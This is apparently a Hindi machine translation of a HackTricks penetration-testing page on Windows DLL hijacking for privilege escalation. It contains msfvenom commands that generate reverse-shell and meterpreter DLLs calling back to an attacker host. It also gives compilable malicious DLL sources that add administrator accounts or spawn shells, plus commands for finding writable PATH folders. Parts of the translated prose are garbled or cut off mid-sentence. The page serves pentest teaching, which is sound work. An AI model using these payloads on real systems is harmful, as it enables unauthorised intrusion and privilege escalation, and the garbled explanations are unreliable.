# डीएल अधिकार हथियाना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण करें**।**
* **अपने हैकिंग ट्रिक्स को** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके अपने हैकिंग ट्रिक्स साझा करें।**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम नियोक्ता हैं!** (_अच्छी पोलिश लिखित और बोली जानी चाहिए_).

{% embed url="https://www.stmcyber.com/careers" %}

## परिभाषा

सबसे पहले, चलो परिभाषा निकाल लेते हैं। डीएल अधिकार हथियाना, सबसे व्यापक रूप में, एक विश्वसनीय/विश्वसनीय एप्लिकेशन को **एक अनियमित डीएल लोड करने में धोखा देना** है। _डीएल खोज क्रम हथियाना_, _डीएल लोड क्रम हथियाना_, _डीएल छल_, _डीएल इंजेक्शन_ और _डीएल साइड-लोडिंग_ जैसे शब्द अक्सर -गलती से- एक ही बात कहने के लिए प्रयोग किए जाते हैं।

डीएल अधिकार हथियाना का उपयोग **कोड को निष्पादित** करने, **स्थायित्व** प्राप्त करने और **अधिकारों को बढ़ाने** के लिए किया जा सकता है। इन 3 में से **सबसे कम संभावित** अधिकार हथियाना है बहुत दूर। हालांकि, यह विशेषण हिस्से का हिस्सा है, मैं इस विकल्प पर ध्यान केंद्रित करूंगा। इसके अलावा, ध्यान दें कि लक्ष्य के बावजूद, डीएल अधिकार हथियाना एक ही तरीके से किया जाता है।

### प्रकार

इसमें चयन करने के लिए **विविध दृष्टिकोण** हैं, जिनकी सफलता उस पर निर्भर करती है कि एप्लिकेशन अपनी आवश्यक डीएल को लोड करने के लिए कैसे कॉन्फ़िगर किया गया है। संभावित दृष्टिकोणों में शामिल हैं:

1. **डीएल प्रतिस्थापन**: एक विश्वसनीय डीएल को एक दुष्ट डीएल के साथ प्रतिस्थापित करें। इसे _डीएल प्रॉक्सीग_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)] के साथ कम्बाइन किया जा सकता है, जो सुनिश्चित करता है कि मूल डीएल की सभी कार्यक्षमता संबंधित रहती है।
2. **डीएल खोज क्रम हथियाना**: एक ऐसी डीएल जिसे एक एप्लिकेशन ने पथ के बिना निर्दिष्ट किया है, एक विशेष क्रम में निर्दिष्ट स्थानों में खोजा जाता है \[[3](https://docs.microsoft.com
## गुम हो गई DLL का उपयोग करना

विशेषाधिकारों को बढ़ाने के लिए, हमारे पास सबसे अच्छा मौका है कि हम किसी ऐसी DLL को लिख सकें जिसे एक विशेषाधिकारी प्रक्रिया लोड करने की कोशिश करेगी किसी ऐसे स्थान पर जहां इसे खोजा जाएगा। इस प्रकार, हमें एक DLL को लिखने में सक्षम होगा जहां DLL को खोजने से पहले खोजे जाने वाले फ़ोल्डर से पहले खोजा जाता है (अजीब मामला), या हमें एक ऐसे फ़ोल्डर पर लिखने में सक्षम होगा जहां DLL को खोजा जाने वाले फ़ोल्डर में मौजूद नहीं है।

### DLL खोज क्रम

**माइक्रोसॉफ्ट दस्तावेज़ीकरण** में आप विशेष रूप से देख सकते हैं कि DLL कैसे लोड होती हैं।

सामान्य रूप से, एक **Windows एप्लिकेशन** DLL खोजने के लिए **पूर्व-निर्धारित खोज पथ** का उपयोग करेगी और यह पथों की एक विशेष क्रम में जांचेगी। DLL हाइजैकिंग आमतौर पर इस समस्या के कारण होती है कि एक खतरनाक DLL को इन फ़ोल्डरों में स्थानित किया जाता है जबकि सुनिश्चित किया जाता है कि वास्तविक DLL से पहले यह खोजा जाता है। इस समस्या को अपनी आवश्यकताओं के अनुसार DLL के लिए निर्दिष्ट पूर्ण पथ निर्दिष्ट करके कम किया जा सकता है।

आप 32-बिट सिस्टम पर DLL खोज क्रम देख सकते हैं:

1. ऐप्लिकेशन ने लोड किया है उस डायरेक्टरी से।
2. सिस्टम डायरेक्टरी। इस डायरेक्टरी का पथ प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) फ़ंक्शन का उपयोग करें। (_C:\Windows\System32_)
3. 16-बिट सिस्टम डायरेक्टरी। इस डायरेक्टरी का पथ प्राप्त करने के लिए कोई फ़ंक्शन नहीं है, लेकिन इसे खोजा जाता है। (_C:\Windows\System_)
4. Windows डायरेक्टरी। इस डायरेक्टरी का पथ प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) फ़ंक्शन का उपयोग करें। (_C:\Windows_)
5. वर्तमान डायरेक्टरी।
6. PATH पर्यावरण चर के सूचीबद्ध डायरेक्टरी। ध्यान दें कि इसमें **App Paths** रजिस्ट्री कुंजी द्वारा निर्दिष्ट प्रति-एप्लिकेशन पथ शामिल नहीं होता है। DLL खोज पथ की गणना करते समय **App Paths** कुंजी का उपयोग नहीं किया जाता है।

यह डिफ़ॉल्ट खोज क्रम है जब **SafeDllSearchMode** सक्षम होता है। जब यह अक्षम होता है, वर्तमान डायरेक्टरी दूसरे स्थान पर बढ़ जाता है। इस सुविधा को अक्षम करने के लिए, **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** रजिस्ट्री मान को बनाएं और इसे 0 पर सेट करें (डिफ़ॉल्ट सक्षम होता है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** के साथ कॉल किया जाता है, तो खोज उस एक्सीक्यूटेबल मॉड्यूल के डायरेक्टरी में शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **एक DLL को केवल नाम के साथ लोड किया जाने पर भी एक पूर्ण पथ निर्दिष्ट करके लोड किया जा सकता है**। उस मामले में वह DLL केवल उस पथ में खोजा जाएगा (यदि DLL के कोई आवश्यकताएं हैं, तो वे नाम के द्वारा लोड किए गए होंगे)।

खोज क्रम को बदलने के अन्य तरीके हैं, लेकिन मैं यहां उन्हें समझाने वाला नहीं हूँ।

#### Windows दस्तावेज़ीकरण से DLL खोज क्रम पर अपवाद

* यदि **एक DLL उसी मॉड्यूल नाम के साथ पहले से ही मेमोरी में लोड हो गई है**, तो सिस्टम केवल पुनर्निर्देशन और एक मंचन पर जांचता है इसे खोजने से पहले लोड की गई DLL के लिए, चाहे वह किसी भी डायरेक्टरी में हो। **सिस्टम DLL की खोज नहीं करता है**।
* यदि DLL उस Windows संस्करण के लिए **ज्ञात DLL सूची में है** जिस पर एप्लिकेशन चल रही है, तो **सिस्टम उसके प्रतिलिपि का उपयोग करता है** (और ज्ञात DLL की आवश्यक DLL, यदि कोई हो) **खोजने के बजाय** DLL के लिए। वर्तमान सिस्टम पर ज्ञात DLL की सूची के लिए, निम्नलिखित रजिस्ट्री कुंजी देखें: **HKEY\_LOCAL\_
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की अनुमतियों की जांच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable के imports और एक dll के exports की भी जांच कर सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
एक पूर्ण गाइड के लिए कैसे **विशेषाधिकार को बढ़ाने के लिए Dll Hijacking का दुरुपयोग करें** जिसमें **सिस्टम पाथ फ़ोल्डर** में लिखने की अनुमति होती है, देखें:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### स्वचालित उपकरण

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जांचेगा कि क्या आपके पास सिस्टम पाथ के अंदर किसी भी फ़ोल्डर पर लिखने की अनुमति है।\
इस दुर्लभता की खोज करने के लिए अन्य रोचक स्वचालित उपकरण हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll_।

### उदाहरण

यदि आप एक उपयोगी स्थिति खोजते हैं तो इसे सफलतापूर्वक शोषण करने के लिए सबसे महत्वपूर्ण चीजों में से एक यह होगा कि **एक dll बनाएं जो कम से कम सभी फ़ंक्शन्स को निर्यात करता है जिन्हें एक्ज़िक्यूटेबल उससे आयात करेगा**। फिर भी, ध्यान दें कि Dll Hijacking मध्यम अधिकार स्तर से उच्च **(UAC को छलने के साथ)** या **उच्च अधिकार से सिस्टम** तक बढ़ाने के लिए उपयोगी होता है। आप एक मान्य dll बनाने का उदाहरण इस dll हिजैकिंग अध्ययन में पा सकते हैं जिसमें dll हिजैकिंग के लिए निर्देशित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले खंड** में आपको कुछ **मूलभूत dll कोड** मिलेगा जो **टेम्पलेट** के रूप में उपयोगी हो सकता है या **अनावश्यक फ़ंक्शन्स को निर्यात करने के लिए एक dll बनाने** के लिए।

## **Dll बनाना और कंपाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll प्रॉक्सी** एक Dll है जो **लोड होने पर आपके दुष्ट कोड को निष्पादित करने के लिए सक्षम होता है** लेकिन यह भी **उचित रूप से प्रकट** और **काम करता है** जैसा कि **वास्तविक पुस्तकालय कोल करके सभी कॉल करता है**।

उपकरण \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* या \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\* के साथ आप वास्तव में **एक executable निर्दिष्ट कर सकते हैं और प्रॉक्सीफाइड dll उत्पन्न कर सकते हैं** या **Dll निर्दिष्ट कर सकते हैं और प्रॉक्सीफाइड dll उत्पन्न कर सकते हैं**।

### **Meterpreter**

**रेव शेल प्राप्त करें (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**मीटरप्रेटर प्राप्त करें (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 में मैंने x64 संस्करण नहीं देखा):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में आपको कंपाइल किए गए Dll में कई फ़ंक्शन्स को **निर्यात करना होगा** जो पीड़ित प्रक्रिया द्वारा लोड किए जाएंगे, यदि ये फ़ंक्शन्स मौजूद नहीं होते हैं तो **बाइनरी उन्हें लोड नहीं कर पाएगा** और **एक्सप्लॉइट विफल हो जाएगा**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

यदि आप **हैकिंग करियर** में रुचि रखते हैं और अहैकेबल को हैक करना चाहते हैं - **हम भर्ती कर रहे हैं!** (_अच्छी पोलिश लिखने और बोलने की जानकारी आवश्यक_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
